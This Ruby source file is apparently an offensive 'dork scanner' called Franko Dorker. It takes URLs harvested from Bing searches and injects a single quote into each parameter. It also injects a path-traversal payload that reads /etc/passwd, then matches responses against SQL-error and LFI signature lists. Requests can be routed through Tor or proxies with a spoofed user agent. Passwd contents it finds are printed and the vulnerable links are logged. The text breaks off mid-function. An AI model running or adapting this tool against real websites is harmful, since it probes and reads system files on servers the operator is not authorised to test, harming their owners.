#!/usr/bin/env ruby
# encoding: utf-8
#
# Franko Dorker: Best Dork Scanner
# Designed with Ruby in mind
# By: Abd Elrahman Mohamed
#
# Greeting from Egypt
# Enjoi World!

#Std Needed------------>
require 'fileutils'
require 'open-uri'
require 'optparse'
require 'resolv'
require 'thread'
require 'tmpdir'
#RubyGems Needed------------>
require 'rubygems'
require 'colorize'
require 'nokogiri'
require 'tor_requests'
#Party Rox------------>

#Trap any Interupts and exit cleanly, if you need to add cleanup code it can go here too...
trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, Shutting things down and exiting program....".red ; exit 666; } 
# Clean our results files.....
def logcleaner(file)
	Dir.mkdir("results/backups") if not File.directory?("results/backups") #confirm results/old exists, if not create it
	foo=[]
	File.open("results/#{file}", 'r').each do |line|
		foo << line
	end
	foo = foo.uniq
	oldfile = [Time.now.strftime("%Y-%m-%d-%H%M%S"),file].join("_")
	FileUtils.mv("results/#{file}", "results/backups/#{oldfile}")
	foo.each do |line|
		clean = File.new("results/#{file}", "a+")
		clean.puts line
		clean.close
	end
end

#Quick class to handle terminal clearing for when you just need to start fresh
class Clear
	def cls
		if RUBY_PLATFORM =~ /win32/ 
			system('cls')
		else
			system('clear')
		end
	end
end

#Class to print simple banner, nothing flashy here
class Banner
	def print
		if RUBY_PLATFORM =~ /win32/ 
			system('cls')
		else
			system('clear')
		end
		puts
		puts "
┏━━━┓╋╋╋╋╋╋╋┏┓╋╋╋╋╋┏━━━┓╋╋╋╋┏┓
┃┏━━┛╋╋╋╋╋╋╋┃┃╋╋╋╋╋┗┓┏┓┃╋╋╋╋┃┃
┃┗━━┳━┳━━┳━┓┃┃┏┳━━┓╋┃┃┃┣━━┳━┫┃┏┳━━┳━┓
┃┏━━┫┏┫┏┓┃┏┓┫┗┛┫┏┓┃╋┃┃┃┃┏┓┃┏┫┗┛┫┃━┫┏┛
┃┃╋╋┃┃┃┏┓┃┃┃┃┏┓┫┗┛┃┏┛┗┛┃┗┛┃┃┃┏┓┫┃━┫┃
┗┛╋╋┗┛┗┛┗┻┛┗┻┛┗┻━━┛┗━━━┻━━┻┛┗┛┗┻━━┻┛".green
		puts "\tBy: ".blue + "Abd-Elrahman Mohamed".yellow
		puts "\t\tfb: ".blue + "www.fb.com/boda.m7md".yellow
		puts
	end
end

#Class for various injection tests we can call and use as we find links from our Bing searches
class InjectorTest
	def regexCheck(url, response, key, value) #Pass the injected url, a response body ARRAY and we will check if it has anything matching any of our special indicators, the key and value from our URL we were testing to get the response

		# Signs of ColdFusion Server
		coldfusion_err = [ "Invalid CFML construct found", "CFM compiler", "ColdFusion documentation", "Context validation error for tag cfif", "ERROR.queryString", "Error Executing Database Query", "SQLServer JDBC Driver", "coldFusion.sql.Parameter", "JDBC SQL", "JDBC error", "SequeLink JDBC Driver", "Invalid data .+ for CFSQLTYPE CF_SQL_INTEGER" ]

		# Misc Errors, Coding Flaws, etc
		misc_err= [ "Microsoft VBScript runtime", "Microsoft VBScript compilation", "Invision Power Board Database Error", "DB2 ODBC", "DB2 error", "DB2 Driver", "unexpected end of SQL command", "invalid query", "SQL command not properly ended", "An illegal character has been found in the statement", "Active Server Pages error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "A syntax error has occurred", "Unclosed quotation mark", "Input string was not in a correct format", "<b>Warning</b>: array_merge", "Warning: array_merge", "Warning: preg_match", "<b>Warning</b>: preg_match", "<exception-type>java.lang.Throwable" ]

		# MS-Access
		msaccess_err  = [ "Microsoft JET Database Engine", "ADODB.Command", "ADODB.Field error", "Microsoft Access Driver", "ODBC Microsoft Access", "BOF or EOF" ]

		# MS-SQL
		mssql_err = [ "Microsoft OLE DB Provider for SQL Server error", "OLE/DB provider returned message", "ODBC SQL Server", "ODBC Error", "Microsoft SQL Native Client" ]

		# MySQL
		mysql_err = [ "<b>Warning</b>: mysql_query", "Warning: mysql_query", "<b>Warning</b>: mysql_fetch_row", "Warning: mysql_fetch_row", "<b>Warning</b>: mysql_fetch_array", "Warning: mysql_fetch_array", "<b>Warning</b>: mysql_fetch_assoc", "Warning: mysql_fetch_assoc", "<b>Warning</b>: mysql_fetch_object", "Warning: mysql_fetch_object", "<b>Warning</b>: mysql_numrows", "Warning: mysql_numrows", "<b>Warning</b>: mysql_num_rows", "Warning: mysql_num_rows", "MySQL Error", "MySQL ODBC", "MySQL Driver", "supplied argument is not a valid MySQL result resource", "error in your SQL syntax", "on MySQL result index", "JDBC MySQL", "<b>Warning</b>: mysql_result", "Warning: mysql_result" ]

		# Oracle
		oracle_err = [ "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "ODBC DB2", "ODBC Oracle", "JDBC Oracle", "ORA-01756", "ORA-00936", "ORA-00921", "ORA-01400", "ORA-01858", "ORA-06502", "ORA-00921", "ORA-01427", "ORA-00942", "<b>Warning</b>: ociexecute", "Warning: ociexecute", "<b>Warning</b>: ocifetchstatement", "Warning: ocifetchstatement", "<b>Warning</b>:  ocifetchinto", "Warning:  ocifetchinto", "error ORA-" ]

		# Postgresql
		pg_err = [ "<b>Warning</b>: pg_connect", "Warning: pg_connect", "<b>Warning</b>:  simplexml_load_file", "Warning:  simplexml_load_file", "Supplied argument is not a valid PostgreSQL result", "PostgreSQL query failed: ERROR: parser: parse error", "<b>Warning</b>: pg_exec", "Warning: pg_exec" ]

		# File Includes
		lfi_err = [ "<b>Warning</b>:  include", "Warning: include", "<b>Warning</b>: require_once", "Warning: require_once", "Disallowed Parent Path", "<b>Warning</b>: main", "Warning: main", "<b>Warning</b>: session_start", "Warning: session_start", "<b>Warning</b>: getimagesize", "Warning: getimagesize", "<b>Warning</b>: include_once", "Warning: include_once" ]

		# Eval()
		eval_err = [ "eval()'d code</b> on line", "eval()'d code on line", "<b>Warning</b>:  Division by zero", "Warning:  Division by zero", "<b>Parse error</b>: syntax error, unexpected", "Parse error: syntax error, unexpected", "<b>Parse error</b>: parse error in", "Parse error: parse error in", "Notice: Undefined variable: node in eval", "<b>Notice</b>: Undefined variable: node in eval" ]

		############Add Your Array for Regex Check and follow the cycles below to build your own for your added array...

		#LFI Test
		tracker=0
		lfi_err.each do |lfi|
			if @@tor == 'fuqya' #TOR Returns our response as a string whereas open-uri returns our response as an array so we need to handle slightly different...............>
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? #Thanks StackOverflow :) #Keeps us from having encoding issues since who knows what kind of shit we will be finding with random dorks and geo option (cyrilic? & others)
				if response =~ /#{lfi}/
					if tracker < 1
						puts "[LFI] ".green + "#{lfi.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/lfi.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
					if resp_line =~ /#{lfi}/
						if tracker < 1
							puts "[LFI] ".green + "#{lfi.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/lfi.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
							tracker += 1
						end
					end
				end
			end
		end

		#Cold Fusion Test
		tracker=0
		coldfusion_err.each do |cold|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{cold}/
					if tracker < 1
						puts "[ColdFusion] ".green + "#{cold.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/coldfusion.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding? #Thanks StackOverflow :)
					if resp_line =~ /#{cold}/
						if tracker < 1
							puts "[ColdFusion] ".green + "#{cold.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/coldfusion.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
						end
						tracker += 1
					end
				end
			end
		end

		#MySQL Test
		tracker=0
		mysql_err.each do |lqsym|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{lqsym}/
					if tracker < 1
						puts "[MySQLi] ".green + "#{lqsym.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/mysqli.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
					if resp_line =~ /#{lqsym}/
						if tracker < 1
							puts "[MySQLi] ".green + "#{lqsym.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/mysqli.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
							tracker += 1
						end
					end
				end
			end
		end

		#MS-SQL Test
		tracker=0
		mssql_err.each do |lqssm|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{lqssm}/
					if tracker < 1
						puts "[MS-SQLi] ".green + "#{lqssm.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/mssqli.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
					if resp_line =~ /#{lqssm}/
						if tracker < 1
							puts "[MS-SQLi] ".green + "#{lqssm.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/mssqli.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
							tracker += 1
						end
					end
				end
			end
		end
		tracker=0

		#MS-Access Test 
		msaccess_err.each do |lqsasm|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{lqsasm}/
					if tracker < 1
						puts "[MS-Access SQLi] ".green + "#{lqsasm.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/msaccess.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
					if resp_line =~ /#{lqsasm}/
						if tracker < 1
							puts "[MS-Access SQLi] ".green + "#{lqsasm.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/msaccess.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping 
							vlinks.close #close our file handle we opened a minute ago
							tracker += 1
						end
					end
				end
			end
		end

		#Postgresql Test
		tracker=0
		pg_err.each do |lqspg|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{lqspg}/
					if tracker < 1
						puts "[Postgres SQLi] ".green + "#{lqspg.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/pgsqli.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
					if resp_line =~ /#{lqspg}/
						if tracker < 1
							puts "[Postgres SQLi] ".green + "#{lqspg.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/pgsqli.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
							tracker += 1
						end
					end
				end
			end
		end

		#Oracle Test 
		tracker=0
		oracle_err.each do |ora|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{ora}/
					if tracker < 1
						puts "[Oracle SQLi] ".green + "#{ora.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/oracle.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
					if resp_line =~ /#{ora}/
						if tracker < 1
							puts "[Oracle SQLi] ".green + "#{ora.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/oracle.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
							tracker += 1
						end
					end
				end
			end
		end

		#Misc Error Messages that might be worth investigating
		tracker=0
		misc_err.each do |misc|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{misc}/
					if tracker < 1
						puts "[Error => vuln?] ".green + "#{misc.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/misc.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
					if resp_line =~ /#{misc}/
						if tracker < 1
							puts "[Error => vuln?] ".green + "#{misc.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/misc.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
							tracker += 1
						end
					end
				end
			end
		end

		# Eval() Test
		tracker=0
		eval_err.each do |evalz|
			if @@tor == 'fuqya'
				response = response.unpack('C*').pack('U*') if !response.valid_encoding? 
				if response =~ /#{evalz}/
					if tracker < 1
						puts "[Eval()] ".green + "#{evalz.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
						vlinks = File.new("results/eval.txt", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			else
				response.each do |resp_line|
					resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding? #Thanks StackOverflow :)
					if resp_line =~ /#{evalz}/
						if tracker < 1
							puts "[Eval()] ".green + "#{evalz.sub(/<b>/, '').sub(/<\/b>/, '')}".green
							puts "\t=> #{url.chomp}".cyan
							puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".yellow unless key.nil?
							puts "\t\t=> Original Value: ".cyan + "#{value}".yellow unless value.nil?
							vlinks = File.new("results/eval.txt", "a+")  #Open our file handle
							vlinks.puts "#{url.chomp}" #Write to file for safe keeping
							vlinks.close #close our file handle we opened a minute ago
						end
						tracker += 1
					end
				end
			end
		end
	end

	def quoteTest(num) #1=Single Dork, 2=File Option (threads?)
		puts "Commencing Injection Tests".red + "....".cyan
		File.open("results/links.txt", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
			begin
				param = URI.parse(line).query #See if we cause any errors to weed out no parameter links....
				#break paramaters into hash [ "key" => "value" ] formatting held in storage for easier manipulation
				params = Hash[URI.parse(line).query.split('&').map{ |q| q.split('=') }] 
				puts "Testing Link".red + ": ".cyan + "#{line.chomp}".yellow
				count=0
				tracker=0
				params.each do |key, value, para| #cycle through hash and print key and associated value
					@key = key
					@value = value
					if params.length > 1 #Multiple Parameter Links
						injlnk = line.sub("#{value}", "#{value}%27") #Set a injection link variable
						@injlnk = injlnk
						if count == 0
							puts "\t=> Multiple Paramters, testing all".blue + "....".cyan
							count += 1
						end
						if @@tor == 'fuqya'
							#TOR Request
							baseurl = URI(injlnk)
							vchk = Tor::HTTP.get(baseurl.host, baseurl.request_uri, baseurl.port).body
						else
							#Normal
							if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
								#RUN NORMAL REQUEST
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							else
								if @@username == 'nada'
									#RUN PROXY WITHOUT AUTH
									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
								else
									#RUN PROXY WITH AUTH
									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
								end
							end
						end
						regexCheck(injlnk, vchk, key, value)
					else #############<=ELSE SINGLE PARAMETER LINKS=>##############
						injlnk = line.sub("#{value}", "#{value}%27") #Set a injection link variable
						@injlnk = injlnk
						if @@tor == 'fuqya'
							#TOR Request
							baseurl = URI(injlnk)
							vchk = Tor::HTTP.get(baseurl.host, baseurl.request_uri, baseurl.port).body
						else
							if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
								#RUN NORMAL REQUEST
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							else
								if @@username == 'nada'
									#RUN PROXY WITHOUT AUTH
									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
								else
									#RUN PROXY WITH AUTH
									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
								end
							end
						end
						regexCheck(injlnk, vchk, key, value)
					end
				end
			#random HTTP errors, i.e. skip link but note error
			rescue OpenURI::HTTPError => e
				if e.to_s == "404 Not Found"
					puts "\t=> #{e}".red
					next
					#############################################################
					#Route to Blind Based INjection Tests for further review.....
					#############################################################
				elsif e.to_s == "500 Internal Server Error"
					#something to scan page anyways for ASP stupid Winblows sites
					puts "\t=> #{e}".red
					puts "\tRunning additional checks".blue + ".....".yellow
					foores = e.io.readlines
					regexCheck(@injlnk, foores, @key, @value)
				else
					puts "\t=> #{e}".red
				end
			rescue Net::HTTPBadResponse
				puts "\t=> Problem reading response due to TOR, sorry".red + "......".yellow
			rescue Errno::ECONNREFUSED
				puts "\t=> Problem communicating with site, connection refused".red + "!".yellow
			rescue Errno::EHOSTUNREACH
				puts "\t=> Problem communicating with site, host unreachable".red + "!".yellow
			rescue EOFError
				puts "\t=> Problem communicating with site".red + "....".yellow
			rescue Errno::EINVAL => e
				puts "\t=> #{e}".yellow
			rescue SocketError
				puts "\t=> Problem connecting to site".red + "....".yellow
			rescue OpenSSL::SSL::SSLError
				puts "\t=> Issues with Remote Host's OpenSSL Server Certificate".red + "....".yellow
			rescue Errno::ENOENT
				puts "\t=> Jacked URL parsing due to no value with parameter, sorry".red + "....".yellow
				next
			rescue Errno::ECONNRESET
				puts "\t=> Problem connecting to site".red + "....".yellow
			rescue RuntimeError => e
				if e.to_s == 'Timeout::Error' # we took longer than read_timeout value said they could :p
					puts "\t=> Connection Timeout".red + "!".cyan
			#open-uri cant redirect properly from http to https due to a check it has built-in, so cant follow redirect :(
				else
					puts "\t=> Can't properly follow the redirect!".red
				end
			rescue Timeout::Error
				#timeout of sorts...skip
				puts "\t=> Connection Timeout!".red
			rescue Errno::ETIMEDOUT
				#timeout of sorts...skip
				puts "\t=> Connection Timeout".red + "!".yellow
			rescue TypeError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".yellow
				next
			rescue URI::InvalidURIError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".yellow
				next
			rescue NoMethodError => e
			# If bad link cause error cause its not a link dont freak out....Dont do anything....got something better?
				puts "Testing Link".red + ": ".cyan + "#{line.chomp}".yellow
				puts "\t=> No Testable Paramaters!".red
				#############################################################
				## should we test sites with no parameters anyways? NOISY? ##
				#############################################################
			end
		end
	end

	#LFI /etc/passwd Injection Test using a genric length injection and regex check for signs of success
	def etcTest(num) #1=Single Dork, 2=File Option (threads?) #Am i using num var anymore??
		puts "Commencing /etc/passwd LFI Injection Test now".red + "....".cyan
		File.open("results/links.txt", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
			begin
				param = URI.parse(line).query #See if we cause any errors to weed out no parameter links....
				#break paramaters into hash [ "key" => "value" ] formatting held in storage for easier manipulation
				params = Hash[URI.parse(line).query.split('&').map{ |q| q.split('=') }] 
				puts "Testing Link".red + ": ".cyan + "#{line.chomp}".yellow
				count=0
				tracker=0
				params.each do |key, value| #cycle through hash and print key and associated value
					@key = key
					@value = value
					if params.length > 1 #Multiple Parameter Links
						injlnk = line.sub("#{value}", "../../../../../../../../../etc/passwd%00") #Set a injection link variable
						@injlnk = injlnk
						if count == 0
							puts "\t=> Multiple Paramters, testing all".blue + "....".cyan
							count += 1
						end
						if @@tor == 'fuqya'
							#TOR Request
							baseurl = URI(injlnk)
							vchk = Tor::HTTP.get(baseurl.host, baseurl.request_uri, baseurl.port).body
						else
							#Normal
							if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
								#RUN NORMAL REQUEST
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							else
								if @@username == 'nada'
									#RUN PROXY WITHOUT AUTH
									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
								else
									#RUN PROXY WITH AUTH
									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
								end
							end
						end

						tracker=0
						if @@tor == 'fuqya'
							vchk = vchk.unpack('C*').pack('U*') if !vchk.valid_encoding? 
							if vchk =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/m
								puts "Link: ".green + "#{injlnk.chomp}".yellow
								puts "File Found: ".green + "/etc/passwd".yellow
								passwdz = $1
								puts "#{passwdz}".cyan
								puts
								vlinks = File.new("results/lfi-confirmed.txt", "a+")  #Open our file handle
								vlinks.puts "#{@injlnk}" #Write to file for safe keeping
								vlinks.close #close our file handle we opened a minute ago
								tracker=2
							end
						else
							passwdz=[]
							vchk.each do |resp_line|
								resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
								if resp_line =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/
									passwdz << $1
									tracker=1
								end
							end
						end
						if tracker.to_i == 0
							regexCheck(injlnk, vchk, key, value)
						elsif tracker.to_i == 1
							puts "Link: ".green + "#{injlnk.chomp}".yellow
							puts "File Found: ".green + "/etc/passwd".yellow
							puts "#{passwdz.join("\n")}".cyan
							puts
							vlinks = File.new("results/lfi-confirmed.txt", "a+") 
							vlinks.puts "#{@injlnk}"
							vlinks.close
						end

					else #############<=ELSE SINGLE PARAMETER LINKS=>##############
						injlnk = line.sub("#{value}", "../../../../../../../../../etc/passwd%00") #Set a injection link variable
						@injlnk = injlnk
						if @@tor == 'fuqya'
							#TOR Request
							baseurl = URI(injlnk)
							vchk = Tor::HTTP.get(baseurl.host, baseurl.request_uri, baseurl.port).body
						else
							if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
								#RUN NORMAL REQUEST
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							else
								if @@username == 'nada'
									#RUN PROXY WITHOUT AUTH
									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
								else
									#RUN PROXY WITH AUTH
